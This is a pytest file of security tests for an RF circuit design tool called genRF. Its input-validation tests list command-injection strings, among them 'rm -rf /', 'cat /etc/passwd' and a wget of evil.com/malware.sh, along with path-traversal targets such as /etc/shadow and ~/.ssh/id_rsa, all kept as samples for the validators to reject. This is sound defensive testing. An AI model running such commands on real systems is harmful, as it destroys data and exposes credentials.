"""Security-focused tests for genRF components."""

import os
import tempfile
import pytest
from unittest.mock import Mock, patch, mock_open
import json


class TestDataSanitization:
    """Test data sanitization and privacy protection."""
    
    def test_netlist_sanitization(self):
        """Test removal of sensitive information from netlists."""
        sensitive_netlist = """
        * Proprietary ACME Corp Design
        * Technology: TSMC_65nm_RF_SECRET
        M1 d g s b nch w=10u l=65n mult=4 ! SECRET_PARAM=1.234
        R1 n1 n2 50 ! Company_Confidential
        """
        
        # Mock sanitization function
        def sanitize_netlist(content):
            lines = content.split('\n')
            sanitized = []
            for line in lines:
                # Remove comments with sensitive keywords
                if any(keyword in line.upper() for keyword in ['SECRET', 'PROPRIETARY', 'CONFIDENTIAL']):
                    continue
                # Anonymize company names
                line = line.replace('ACME Corp', 'GenRF')
                sanitized.append(line)
            return '\n'.join(sanitized)
        
        sanitized = sanitize_netlist(sensitive_netlist)
        
        assert 'SECRET' not in sanitized.upper()
        assert 'PROPRIETARY' not in sanitized.upper()
        assert 'CONFIDENTIAL' not in sanitized.upper()
        assert 'ACME Corp' not in sanitized
        
    def test_pdk_path_sanitization(self):
        """Test PDK paths are not exposed in outputs."""
        pdk_path = "/secret/company/pdk/tsmc65/models.lib"
        
        # Mock circuit export
        def export_circuit(circuit_data, pdk_path):
            # Should not include absolute PDK paths
            export_data = {
                'netlist': circuit_data,
                'technology': 'tsmc65',  # Generic name only
                'models': 'standard_models.lib'  # Relative path
            }
            return export_data
        
        result = export_circuit("test circuit", pdk_path)
        
        # Verify no sensitive paths leaked
        result_str = json.dumps(result)
        assert '/secret/' not in result_str
        assert '/company/' not in result_str
        assert pdk_path not in result_str


class TestInputValidation:
    """Test input validation and injection prevention."""
    
    def test_spice_command_injection_prevention(self):
        """Test prevention of command injection in SPICE calls."""
        malicious_inputs = [
            "test.cir; rm -rf /",
            "circuit.sp && cat /etc/passwd",
            "design.net | wget evil.com/malware.sh",
            "file.cir `id`",
            "netlist.sp $(whoami)"
        ]
        
        def validate_spice_filename(filename):
            # Basic validation - only allow safe characters
            import re
            if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
                raise ValueError(f"Invalid filename: {filename}")
            if any(char in filename for char in [';', '&', '|', '`', '$', '(', ')']):
                raise ValueError(f"Potentially dangerous characters in filename: {filename}")
            return True
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValueError):
                validate_spice_filename(malicious_input)
                
    def test_file_path_traversal_prevention(self):
        """Test prevention of directory traversal attacks."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "../../../../secret/pdk/models.lib",
            "circuit/../../../home/user/.ssh/id_rsa"
        ]
        
        def validate_output_path(path, allowed_base="/tmp/genrf_output"):
            import os
            # Resolve path and check it's within allowed directory
            abs_path = os.path.abspath(path)
            abs_base = os.path.abspath(allowed_base)
            
            if not abs_path.startswith(abs_base):
                raise ValueError(f"Path outside allowed directory: {path}")
            return True
        
        for malicious_path in malicious_paths:
            with pytest.raises(ValueError):
                validate_output_path(malicious_path)


class TestSecretManagement:
    """Test proper handling of secrets and credentials."""
    
    def test_no_hardcoded_secrets(self):
        """Test that no secrets are hardcoded in the codebase."""
        # This would typically scan actual source files
        # For demo, we test the concept
        
        suspicious_patterns = [
            "password=",
            "api_key=", 
            "secret_key=",
            "token=",
            "-----BEGIN PRIVATE KEY-----"
        ]
        
        sample_code = """
        def connect_to_service():
            config = {
                'host': 'api.example.com',
                'username': os.getenv('API_USERNAME'),
                'password': os.getenv('API_PASSWORD')  # Good - from env
            }
            return config
        """
        
        # Should not contain hardcoded secrets
        for pattern in suspicious_patterns:
            # This is good - using environment variables
            if pattern in sample_code and "os.getenv" not in sample_code:
                pytest.fail(f"Potential hardcoded secret found: {pattern}")
                
    def test_environment_variable_usage(self):
        """Test that sensitive config uses environment variables."""
        with patch.dict(os.environ, {'PDK_LICENSE_KEY': 'test_key_123'}):
            # Mock function that should use env vars
            def get_pdk_config():
                return {
                    'license_key': os.getenv('PDK_LICENSE_KEY'),
                    'license_server': os.getenv('PDK_LICENSE_SERVER', 'localhost')
                }
            
            config = get_pdk_config()
            assert config['license_key'] == 'test_key_123'
            assert config['license_server'] == 'localhost'


class TestAccessControl:
    """Test access control and permissions."""
    
    def test_file_permissions(self):
        """Test that generated files have appropriate permissions."""
        with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
            tmp_file.write(b"test circuit data")
            tmp_path = tmp_file.name
            
        try:
            # Set secure permissions (owner read/write only)
            os.chmod(tmp_path, 0o600)
            
            # Verify permissions
            stat_info = os.stat(tmp_path)
            permissions = oct(stat_info.st_mode)[-3:]
            
            assert permissions == '600', f"File permissions {permissions} should be 600"
            
        finally:
            os.unlink(tmp_path)
            
    def test_temporary_file_cleanup(self):
        """Test that temporary SPICE files are properly cleaned up."""
        temp_files = []
        
        # Mock creation of temporary files
        def create_temp_spice_file():
            tmp = tempfile.NamedTemporaryFile(suffix='.cir', delete=False)
            temp_files.append(tmp.name)
            tmp.write(b"* Temporary SPICE netlist\n")
            tmp.close()
            return tmp.name
        
        # Create some temp files
        for _ in range(3):
            create_temp_spice_file()
            
        # Verify files exist
        for temp_file in temp_files:
            assert os.path.exists(temp_file)
            
        # Mock cleanup function
        def cleanup_temp_files():
            for temp_file in temp_files:
                if os.path.exists(temp_file):
                    os.unlink(temp_file)
        
        cleanup_temp_files()
        
        # Verify cleanup worked
        for temp_file in temp_files:
            assert not os.path.exists(temp_file)


class TestLoggingSecurity:
    """Test secure logging practices."""
    
    def test_no_sensitive_data_in_logs(self):
        """Test that sensitive data is not logged."""
        import logging
        from io import StringIO
        
        # Create in-memory log handler
        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)
        logger = logging.getLogger('test_logger')
        logger.addHandler(handler)
        logger.setLevel(logging.DEBUG)
        
        # Mock function that should not log sensitive data
        def process_pdk_data(pdk_license, model_params):
            logger.info(f"Processing PDK with license: {'*' * len(pdk_license)}")
            logger.debug(f"Model parameters: {len(model_params)} items")
            # Should NOT log: logger.debug(f"License key: {pdk_license}")
            
        process_pdk_data("SECRET_LICENSE_123", {"param1": 1.23, "param2": 4.56})
        
        log_contents = log_stream.getvalue()
        
        # Verify sensitive data is not in logs
        assert "SECRET_LICENSE_123" not in log_contents
        assert "param1" not in log_contents  # Actual parameter values
        assert "param2" not in log_contents
        
        # But should contain safe information
        assert "Processing PDK" in log_contents
        assert "2 items" in log_contents


class TestComplianceChecks:
    """Test compliance with security standards."""
    
    def test_export_control_compliance(self):
        """Test export control restrictions are enforced."""
        restricted_countries = ['CN', 'RU', 'IR', 'KP']  # Example restricted countries
        
        def check_export_compliance(user_country, circuit_frequency):
            # Example: Restrict high-frequency circuits to certain countries
            if user_country in restricted_countries and circuit_frequency > 10e9:  # 10 GHz
                raise ValueError(f"Export restricted: {circuit_frequency/1e9:.1f} GHz circuit to {user_country}")
            return True
        
        # Should allow normal frequencies
        check_export_compliance('US', 2.4e9)  # 2.4 GHz - OK
        
        # Should restrict high frequencies to restricted countries
        with pytest.raises(ValueError):
            check_export_compliance('CN', 28e9)  # 28 GHz - Restricted
            
    def test_audit_trail_generation(self):
        """Test that security-relevant actions are logged for audit."""
        audit_log = []
        
        def audit_log_action(action, user, details):
            import datetime
            audit_log.append({
                'timestamp': datetime.datetime.now().isoformat(),
                'action': action,
                'user': user,
                'details': details
            })
        
        # Mock security-relevant actions
        audit_log_action('PDK_ACCESS', 'user123', {'pdk': 'tsmc65', 'license_check': 'passed'})
        audit_log_action('CIRCUIT_EXPORT', 'user123', {'format': 'SKILL', 'frequency': '2.4GHz'})
        
        assert len(audit_log) == 2
        assert audit_log[0]['action'] == 'PDK_ACCESS'
        assert audit_log[1]['action'] == 'CIRCUIT_EXPORT'
        assert all('timestamp' in entry for entry in audit_log)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])